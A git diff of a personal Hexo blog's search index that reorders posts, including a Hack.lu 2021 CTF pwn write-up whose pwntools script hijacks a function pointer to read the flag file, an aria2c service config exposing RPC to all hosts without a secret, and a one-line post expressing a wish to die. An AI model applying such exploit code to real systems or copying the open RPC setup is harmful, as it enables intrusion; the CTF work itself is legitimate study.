@@ -304,6 +304,12 @@
 ]]></content>
   </entry>
   <entry>
+    <title>活着好累</title>
+    <url>/2021/03/23/huo-zhao-hao-lei/</url>
+    <content><![CDATA[<p>活着好累，要是能死就好了</p>
+]]></content>
+  </entry>
+  <entry>
     <title>自制新插件添加~</title>
     <url>/2020/11/25/zi-zhi-cha-jian-tian-jia/</url>
     <content><![CDATA[<p>大概自己做了一个小插件</p>
@@ -318,12 +324,6 @@
 <li><code>git clone https://github.com/LXG-Shadow/hexo-background-plus</code></li>
 <li>打开package.json,<br> 在dependencies中添加<code>&quot;hexo-background-plus&quot;:&quot;^0.0.1&quot;</code></li>
 </ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>活着好累</title>
-    <url>/2021/03/23/huo-zhao-hao-lei/</url>
-    <content><![CDATA[<p>活着好累，要是能死就好了</p>
 ]]></content>
   </entry>
   <entry>
@@ -665,21 +665,6 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </tags>
   </entry>
   <entry>
-    <title>Fininshing Update Shazam analysis(chinese version)</title>
-    <url>/2019/02/09/blogarchive/2019-02-09-20-46-15/</url>
-    <content><![CDATA[<p>See </p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/13">First section</a><br>-<a href="https://www.bilibili.com/read/cv1904784">Bilibili</a></p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/14">Second section</a>-<a href="https://www.bilibili.com/read/cv1965924">Bilibili</a></p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/15">Third section</a>-<a href="https://www.bilibili.com/read/cv2016569">Bilibili</a></p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>shazam</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>raspberry pi using vnc, can&#39;t log in.</title>
     <url>/2019/02/09/blogarchive/2019-02-09-20-53-39/</url>
     <content><![CDATA[<p>Last night, when i was using vnc to log in my ras pi, i found that i stuck in the login menu.</p>
@@ -692,6 +677,21 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </categories>
       <tags>
         <tag>raspberryPi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fininshing Update Shazam analysis(chinese version)</title>
+    <url>/2019/02/09/blogarchive/2019-02-09-20-46-15/</url>
+    <content><![CDATA[<p>See </p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/13">First section</a><br>-<a href="https://www.bilibili.com/read/cv1904784">Bilibili</a></p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/14">Second section</a>-<a href="https://www.bilibili.com/read/cv1965924">Bilibili</a></p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/15">Third section</a>-<a href="https://www.bilibili.com/read/cv2016569">Bilibili</a></p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>shazam</tag>
       </tags>
   </entry>
   <entry>
@@ -1304,6 +1304,15 @@ server {
       </tags>
   </entry>
   <entry>
+    <title>utf-8 乱码表</title>
+    <url>/2019/09/06/blogarchive/2019-09-06-10-34-25/</url>
+    <content><![CDATA[<p><img src="/images/20201124847.png" alt="utf 乱码表"></p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+  </entry>
+  <entry>
     <title>add cdn for live2d models</title>
     <url>/2019/09/16/blogarchive/2019-09-16-22-32-00/</url>
     <content><![CDATA[<p>add cdn for live2d models</p>
@@ -1311,15 +1320,6 @@ server {
 ]]></content>
       <categories>
         <category>SiteDev</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>utf-8 乱码表</title>
-    <url>/2019/09/06/blogarchive/2019-09-06-10-34-25/</url>
-    <content><![CDATA[<p><img src="/images/20201124847.png" alt="utf 乱码表"></p>
-]]></content>
-      <categories>
-        <category>Programming</category>
       </categories>
   </entry>
   <entry>
@@ -2267,6 +2267,47 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>打开user lingering来运行服务 + 在linux上建立aria2c服务</title>
+    <url>/2022/04/24/devops/enable-linux-user-lingering-for-service/</url>
+    <content><![CDATA[<h1 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h1><p>最近在搞自己的小主机，在配置自己的<strong>aria2c</strong>服务的时候，发现aria2的服务时不时就会断掉,并报错<code>Emergency shutdown sequence commencing</code>。</p>
+<p>本文介绍了如何修复这个问题，以及我的aria2服务配置</p>
+<span id="more"></span>
+
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>因为想要aria2c以非root用户运行，我用 <code>systemctl --user start aria2.service</code>，这个时候服务正常启动，也不会结束。</p>
+<p>但是，一旦我退出这个ssh session，过几秒之后aria2c就会自动停止。</p>
+<p>重复几次试验后，确认了退出ssh session后，aria2c服务就会停止。</p>
+<p>下面是报错的日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022-04-24 12:55:45.578362 [NOTICE] [HttpListenCommand.cc:108] IPv4 RPC: listening on TCP port 6800</span><br><span class="line">2022-04-24 12:55:45.578468 [NOTICE] [HttpListenCommand.cc:108] IPv6 RPC: listening on TCP port 6800</span><br><span class="line">2022-04-24 12:55:57.533186 [NOTICE] [DownloadEngine.cc:265] Emergency shutdown sequence commencing...</span><br></pre></td></tr></table></figure>
+
+<h1 id="原因-amp-解决方法"><a href="#原因-amp-解决方法" class="headerlink" title="原因&amp;解决方法"></a>原因&amp;解决方法</h1><p>在进行了一定时间的互联网冲浪后，我在stackexchange上找到了解决方法: <a href="https://unix.stackexchange.com/questions/522545/systemd-shutting-down-when-terminal-is-closed">链接</a>.</p>
+<p>原因是运行这个service的用户没有<code>user lingering</code>。</p>
+<p>根据 <a href="https://www.freedesktop.org/software/systemd/man/loginctl.html">loginctl</a> 的 man page所说</p>
+<blockquote>
+<p>Enable/disable user lingering for one or more users. If enabled for a specific user, a user manager is spawned for the user at boot and kept around after logouts. This allows users who are not logged in to run long-running services. </p>
+</blockquote>
+<p>简单来说，如果一个用户没有开启<code>user lingering</code>，他开启的service在这个用户登出之后就会自行结束。</p>
+<p>所以，解决方法就是为运行这个service的用户开启<code>user lingering</code></p>
+<p>我们可以用这个命令来打开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo loginctl enable-linger aynakeya # enable user linger for aynakeya</span><br></pre></td></tr></table></figure>
+
+<p>开启完毕后我们再次启动service，然后登出ssh session。发现这个时候aria2已经不会自动退出了。</p>
+<h1 id="Aria2-As-Service"><a href="#Aria2-As-Service" class="headerlink" title="Aria2 As Service"></a>Aria2 As Service</h1><p>顺便贴一下aria2作为系统服务的配置。</p>
+<p>安装好aria2后，把这个文件<code>aria2.service</code> 放到 <code>/etc/systemd/user/</code>目录下即可。</p>
+<p>启动aria2的方式为:  <code>systemctl --user start aria2.service</code><br>关闭为: <code>systemctl --user stop aria2.service</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Aria2c As Service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/bin/aria2c -D --conf-path=/home/aynakeya/repo/aria2/aria2-daemon.conf</span><br><span class="line">WorkingDirectory=/home/aynakeya/repo/aria2</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=default.target</span><br></pre></td></tr></table></figure>
+
+<p><code>aria2-daemon.conf</code>的内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># server config</span><br><span class="line">continue=true</span><br><span class="line"># run as service</span><br><span class="line">daemon=true</span><br><span class="line">#设置加密的密钥</span><br><span class="line">#rpc-secret=aaabbbccc</span><br><span class="line">#允许rpc</span><br><span class="line">enable-rpc=true</span><br><span class="line">#允许所有来源, web界面跨域权限需要</span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line">#允许外部访问，false的话只监听本地端口</span><br><span class="line">rpc-listen-all=true</span><br><span class="line">#RPC端口, 仅当默认端口被占用时修改</span><br><span class="line">#rpc-listen-port=6800</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># logging config</span><br><span class="line">log=/home/aynakeya/repo/aria2/log/aria2.log</span><br><span class="line">log-level=notice</span><br><span class="line"></span><br><span class="line"># download config</span><br><span class="line"></span><br><span class="line">#最大同时下载数(任务数), 路由建议值: 3</span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line">#断点续传</span><br><span class="line">continue=true</span><br><span class="line">#同服务器连接数</span><br><span class="line">max-connection-per-server=5</span><br><span class="line">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span><br><span class="line">min-split-size=10M</span><br><span class="line">#单文件最大线程数, 路由建议值: 5</span><br><span class="line">split=10</span><br><span class="line">#下载速度限制</span><br><span class="line">max-overall-download-limit=0</span><br><span class="line">#单文件速度限制</span><br><span class="line">max-download-limit=0</span><br><span class="line">#上传速度限制</span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line">#单文件速度限制</span><br><span class="line">max-upload-limit=0</span><br><span class="line">#断开速度过慢的连接</span><br><span class="line">#lowest-speed-limit=0</span><br><span class="line">#验证用，需要1.16.1之后的release版本</span><br><span class="line">#referer=*</span><br><span class="line">#文件保存路径, 默认为当前启动位置</span><br><span class="line">dir=/home/aynakeya/Downloads</span><br><span class="line">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span><br><span class="line">#disk-cache=0</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>DevOps</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>aria2</tag>
+        <tag>lingering</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于爬虫限制并发数我竟然用阻塞来实现 20220324编程日记</title>
     <url>/2022/03/24/life/20220324-bian-cheng-ri-ji/</url>
     <content><![CDATA[<p>不是，就挺离谱的。</p>
@@ -2371,45 +2412,6 @@ https://www.bsfdvbsbilibili.com
         <tag>bilibili</tag>
         <tag>ctf</tag>
         <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
-    <url>/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/</url>
-    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
-<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
-<p>using decompiler and take a deep look at functions.</p>
-<span id="more"></span>
-
-<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
-<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
-<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
-<p>notice that string “stonks.txt” are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
-<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to “flag.txt” instead of “stonks.txt”</p>
-<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
-<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
-<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
-<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
-<p>in this case, str is the address of <code>byte_22058</code>, and “%s” can also found in the data section.</p>
-<p>therefore, we have the process of getting the flag.</p>
-<ol>
-<li>use 1056: change function address to scanf</li>
-<li>use 4619: call scanf and write flag.txt to byte_22058</li>
-<li>use 48: print out the file content in filename(byte_22058)</li>
-</ol>
-<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
-        <tag>hack.lu</tag>
       </tags>
   </entry>
   <entry>
@@ -2653,6 +2655,45 @@ https://www.bsfdvbsbilibili.com
         <tag>writeup</tag>
         <tag>ductf</tag>
         <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
+    <url>/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/</url>
+    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
+<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
+<p>using decompiler and take a deep look at functions.</p>
+<span id="more"></span>
+
+<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
+<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
+<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
+<p>notice that string “stonks.txt” are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
+<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to “flag.txt” instead of “stonks.txt”</p>
+<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
+<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
+<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
+<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
+<p>in this case, str is the address of <code>byte_22058</code>, and “%s” can also found in the data section.</p>
+<p>therefore, we have the process of getting the flag.</p>
+<ol>
+<li>use 1056: change function address to scanf</li>
+<li>use 4619: call scanf and write flag.txt to byte_22058</li>
+<li>use 48: print out the file content in filename(byte_22058)</li>
+</ol>
+<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>hack.lu</tag>
       </tags>
   </entry>
   <entry>
